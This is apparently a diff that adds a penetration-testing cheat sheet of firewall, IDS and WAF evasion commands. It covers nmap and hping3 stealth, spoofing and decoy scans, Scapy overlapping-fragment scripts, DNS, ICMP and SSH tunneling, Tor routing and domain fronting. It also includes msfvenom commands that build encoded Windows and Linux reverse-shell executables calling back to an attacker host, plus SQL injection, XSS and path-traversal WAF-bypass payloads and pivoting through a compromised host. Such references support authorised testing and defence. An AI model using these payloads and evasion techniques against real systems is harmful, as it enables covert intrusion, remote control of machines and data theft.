@@ -1,0 +1,342 @@
+# Network Evasion and Firewall/IDS Bypass Payloads
+
+## Firewall Detection
+
+### ACK Scan (Firewall Detection)
+nmap -sA 192.168.1.100                                                 # ACK scan
+nmap -sA -p 1-65535 192.168.1.100                                      # Full port ACK scan
+hping3 -A -p 80 192.168.1.100                                          # ACK probe
+
+### FIN Scan (Firewall Evasion)
+nmap -sF 192.168.1.100                                                 # FIN scan
+hping3 -F -p 80 192.168.1.100                                          # FIN probe
+
+### NULL Scan
+nmap -sN 192.168.1.100                                                 # NULL scan
+hping3 -p 80 192.168.1.100                                             # No flags set
+
+### Xmas Scan
+nmap -sX 192.168.1.100                                                 # Xmas scan
+hping3 -F -P -U -p 80 192.168.1.100                                    # FIN, PUSH, URG flags
+
+### Idle Scan (Zombie Scan)
+nmap -sI zombie.host.com:80 192.168.1.100                              # Idle scan
+nmap -Pn -sI 192.168.1.50 192.168.1.100                                # With zombie IP
+
+## Packet Fragmentation
+
+### IP Fragmentation
+nmap -f 192.168.1.100                                                  # Fragment packets (8 bytes)
+nmap -f -f 192.168.1.100                                               # 16-byte fragments
+nmap --mtu 16 192.168.1.100                                            # Custom MTU
+nmap --mtu 24 192.168.1.100                                            # 24-byte MTU
+hping3 -f -p 80 192.168.1.100                                          # Fragmented packets
+
+### Fragroute
+fragroute 192.168.1.100                                                # Intercept and fragment
+# Edit /etc/fragroute.conf
+# ip_frag 24
+# tcp_seg 24
+
+### Fragment Overlap Attack
+# Using Scapy
+python3 << 'EOF'
+from scapy.all import *
+packet1 = IP(dst="192.168.1.100", flags="MF", frag=0)/TCP(dport=80)/"AAAA"
+packet2 = IP(dst="192.168.1.100", frag=1)/("BBBB")
+send([packet1, packet2])
+EOF
+
+## Timing Evasion
+
+### Paranoid Timing (T0)
+nmap -T0 192.168.1.100                                                 # 5 minutes between probes
+nmap -T0 -p 1-100 192.168.1.100                                        # Ultra slow scan
+
+### Sneaky Timing (T1)
+nmap -T1 192.168.1.100                                                 # 15 seconds between probes
+
+### Polite Timing (T2)
+nmap -T2 192.168.1.100                                                 # Slow scan
+
+### Custom Timing
+nmap --scan-delay 10s 192.168.1.100                                    # 10 second delay
+nmap --max-rate 10 192.168.1.100                                       # Max 10 packets/sec
+nmap --min-rate 1 192.168.1.100                                        # Min 1 packet/sec
+nmap --max-retries 1 192.168.1.100                                     # Reduce retries
+
+## Source IP Spoofing
+
+### Spoof Source Address
+nmap -S 192.168.1.50 192.168.1.100                                     # Spoof source IP
+nmap -S www.example.com 192.168.1.100                                  # Spoof with hostname
+hping3 -a 192.168.1.50 -p 80 192.168.1.100                             # Spoof with hping3
+
+### Decoy Scanning
+nmap -D RND:10 192.168.1.100                                           # 10 random decoys
+nmap -D decoy1,decoy2,ME,decoy3 192.168.1.100                          # Specific decoys
+nmap -D 192.168.1.50,192.168.1.51,ME 192.168.1.100                     # Mix of real and spoofed
+
+### Decoy with Fragmentation
+nmap -f -D RND:5 192.168.1.100                                         # Fragmented decoy scan
+
+## Source Port Manipulation
+
+### Use Specific Source Port
+nmap -g 53 192.168.1.100                                               # Source port 53 (DNS)
+nmap -g 80 192.168.1.100                                               # Source port 80 (HTTP)
+nmap --source-port 443 192.168.1.100                                   # Source port 443
+hping3 -s 53 -p 80 192.168.1.100                                       # Source port 53
+
+### Common Trusted Ports
+nmap -g 20 192.168.1.100                                               # FTP data
+nmap -g 53 192.168.1.100                                               # DNS
+nmap -g 67 192.168.1.100                                               # DHCP server
+nmap -g 88 192.168.1.100                                               # Kerberos
+
+## MAC Address Spoofing
+
+### Spoof MAC Address
+nmap --spoof-mac 0 192.168.1.100                                       # Random MAC
+nmap --spoof-mac Apple 192.168.1.100                                   # Apple vendor
+nmap --spoof-mac Dell 192.168.1.100                                    # Dell vendor
+nmap --spoof-mac 00:11:22:33:44:55 192.168.1.100                       # Specific MAC
+
+### MAC Spoofing at Interface Level
+ifconfig eth0 down
+ifconfig eth0 hw ether 00:11:22:33:44:55
+ifconfig eth0 up
+
+# Alternative
+ip link set dev eth0 down
+ip link set dev eth0 address 00:11:22:33:44:55
+ip link set dev eth0 up
+
+## Data Obfuscation
+
+### Append Random Data
+nmap --data-length 25 192.168.1.100                                    # Append 25 bytes
+nmap --data-length 50 192.168.1.100                                    # Append 50 bytes
+hping3 -d 100 -p 80 192.168.1.100                                      # 100 bytes data
+
+### Invalid Checksum
+nmap --badsum 192.168.1.100                                            # Bad TCP/UDP checksum
+hping3 --badcksum -p 80 192.168.1.100                                  # Invalid checksum
+
+## Protocol Tunneling
+
+### HTTP Tunneling
+# Using proxytunnel
+proxytunnel -p proxy.com:8080 -d target.com:22 -a 5000                 # HTTP tunnel to SSH
+
+### DNS Tunneling
+iodine -f 192.168.1.100 tunnel.domain.com                              # DNS tunnel client
+dnscat2 tunnel.domain.com                                              # Dnscat2 client
+
+### ICMP Tunneling
+ptunnel -p 192.168.1.100 -lp 8000 -da 10.0.0.1 -dp 22                  # ICMP tunnel
+icmptunnel                                                             # ICMP tunnel
+hans -c 192.168.1.100 -p password                                      # Hans ICMP VPN
+
+### SSH Tunneling
+ssh -D 1080 user@192.168.1.100                                         # Dynamic SOCKS proxy
+ssh -L 8080:target:80 user@192.168.1.100                               # Local port forward
+ssh -R 8080:localhost:80 user@192.168.1.100                            # Remote port forward
+ssh -N -f -D 1080 user@192.168.1.100                                   # Background SOCKS
+
+## Proxychains
+
+### Basic Proxychains
+proxychains nmap -sT 192.168.1.100                                     # Through proxy chain
+proxychains curl http://192.168.1.100                                  # HTTP request
+proxychains ssh user@192.168.1.100                                     # SSH connection
+
+### Configure Proxychains
+# Edit /etc/proxychains.conf
+# dynamic_chain or strict_chain
+# Add proxies: socks5 127.0.0.1 9050
+
+### Multiple Proxy Chains
+proxychains4 -f custom.conf nmap -sT 192.168.1.100                     # Custom config
+
+## Tor Network
+
+### Tor Routing
+tor                                                                    # Start Tor
+proxychains nmap -sT -Pn -p 80,443 192.168.1.100                       # Through Tor
+torsocks curl http://192.168.1.100                                     # Curl through Tor
+
+### Tor with Proxychains
+# /etc/proxychains.conf
+# socks5 127.0.0.1 9050
+proxychains firefox                                                    # Browser through Tor
+
+## IDS/IPS Evasion
+
+### Script Evasion
+nmap --script-args http.useragent="Mozilla/5.0" 192.168.1.100          # Custom User-Agent
+nmap --script-args http.useragent="GoogleBot" 192.168.1.100            # Googlebot UA
+
+### Randomize Scan Order
+nmap --randomize-hosts 192.168.1.0/24                                  # Random host order
+nmap --randomize-hosts -iL targets.txt                                 # Random from list
+
+### Avoid Signature Detection
+# Use custom payloads
+# Modify exploit code
+# Encode payloads
+
+### Packet Mangling
+# Using iptables to mangle packets
+iptables -t mangle -A OUTPUT -p tcp --dport 80 -j TTL --ttl-set 128    # Set TTL
+
+## Encoding and Encryption
+
+### Base64 Encoding
+echo "payload" | base64                                                # Encode
+echo "cGF5bG9hZA==" | base64 -d                                        # Decode
+
+### URL Encoding
+# Use in HTTP requests
+# %20 for space, %2F for /, etc.
+
+### Hex Encoding
+echo "payload" | xxd -p                                                # Hex encode
+echo "7061796c6f6164" | xxd -r -p                                      # Hex decode
+
+### SSL/TLS Encryption
+# Wrap traffic in SSL/TLS
+stunnel /etc/stunnel/stunnel.conf                                      # SSL tunnel
+openssl s_client -connect 192.168.1.100:443                            # SSL connection
+
+## Application Layer Evasion
+
+### HTTP Header Manipulation
+curl -H "X-Forwarded-For: 127.0.0.1" http://192.168.1.100              # Spoof XFF
+curl -H "User-Agent: Mozilla/5.0" http://192.168.1.100                 # Custom UA
+curl -H "Referer: http://trusted.com" http://192.168.1.100             # Fake referer
+
+### HTTP Method Smuggling
+# Use different HTTP methods
+curl -X TRACE http://192.168.1.100                                     # TRACE method
+curl -X OPTIONS http://192.168.1.100                                   # OPTIONS method
+
+### Host Header Manipulation
+curl -H "Host: internal.domain" http://192.168.1.100                   # Custom host header
+
+## Payload Encoding (Metasploit)
+
+### Metasploit Encoders
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o payload.exe
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f elf -o payload.elf
+
+### Multiple Encoding
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 10 -e x86/countdown -i 5 -f exe
+
+## Traffic Normalization Bypass
+
+### TTL Manipulation
+hping3 -t 64 -p 80 192.168.1.100                                       # Set TTL to 64
+hping3 -t 128 -p 80 192.168.1.100                                      # Set TTL to 128
+nmap --ttl 64 192.168.1.100                                            # Nmap TTL
+
+### IP ID Manipulation
+hping3 -N 12345 -p 80 192.168.1.100                                    # Set IP ID
+
+### Sequence Number Manipulation
+hping3 -M 1000000 -L 2000000 -p 80 192.168.1.100                       # Set SEQ/ACK
+
+## Firewall Rule Enumeration
+
+### Firewalking
+firewalk -S 1-1024 -d 192.168.1.100 192.168.1.1                        # Firewall walking
+firewalk -p TCP -S 1-65535 192.168.1.100 192.168.1.1                   # Full TCP range
+
+### Traceroute for Firewall Detection
+traceroute -T -p 80 192.168.1.100                                      # TCP traceroute
+traceroute -I 192.168.1.100                                            # ICMP traceroute
+tcptraceroute 192.168.1.100 80                                         # TCP traceroute
+
+## IPv6 Evasion
+
+### IPv6 Tunneling
+# 6to4 tunneling
+# Teredo tunneling
+miredo                                                                 # Teredo client
+
+### IPv6 Scanning
+nmap -6 fe80::1%eth0                                                   # IPv6 scan
+nmap -6 -sT 2001:db8::1                                                # IPv6 TCP scan
+
+## Advanced Evasion with Scapy
+
+### Custom Packet Crafting
+python3 << 'EOF'
+from scapy.all import *
+
+# Custom TCP packet with unusual flags
+packet = IP(dst="192.168.1.100")/TCP(dport=80, flags="FA")
+send(packet)
+
+# Fragmented packet
+packet = fragment(IP(dst="192.168.1.100")/TCP(dport=80)/"X"*1000)
+send(packet)
+
+# Overlapping fragments
+frag1 = IP(dst="192.168.1.100", flags="MF", frag=0)/TCP(dport=80)/"AAA"
+frag2 = IP(dst="192.168.1.100", frag=1)/"BBB"
+send([frag1, frag2])
+EOF
+
+## Domain Fronting
+
+### CDN Domain Fronting
+curl -H "Host: allowed.cloudfront.net" https://blocked.site.com        # Domain fronting
+
+### SNI Manipulation
+# Use different SNI than actual host
+# Bypass SNI-based filtering
+
+## WAF Bypass Techniques
+
+### SQL Injection WAF Bypass
+# Use comments: /*!50000SELECT*/ * FROM users
+# Use encoding: %53%45%4c%45%43%54
+# Use case variation: SeLeCt
+
+### XSS WAF Bypass
+# Use HTML entities: &lt;script&gt;
+# Use alternate encodings
+# Use event handlers: <img src=x onerror=alert(1)>
+
+### Path Traversal WAF Bypass
+# Use double encoding: ..%252f..%252f
+# Use different separators: ..\\..\\ (Windows)
+# Use URL encoding: ..%2f..%2f
+
+## Network Segmentation Bypass
+
+### VLAN Hopping
+# Double tagging
+# Switch spoofing (DTP)
+yersinia -I                                                            # VLAN attacks
+
+### Pivoting Through Compromised Host
+# SSH pivoting
+ssh -D 1080 user@compromised.host                                      # SOCKS proxy
+# Metasploit pivoting
+msfconsole -x "use auxiliary/server/socks_proxy; run"
+
+## Covert Channels
+
+### Covert Timing Channel
+# Encode data in packet timing
+# Use inter-packet delays to transmit information
+
+### Protocol Steganography
+# Hide data in protocol fields
+# Use reserved fields, options, or padding
+
+### DNS Covert Channel
+# Encode data in DNS queries
+# Use subdomain labels to exfiltrate data
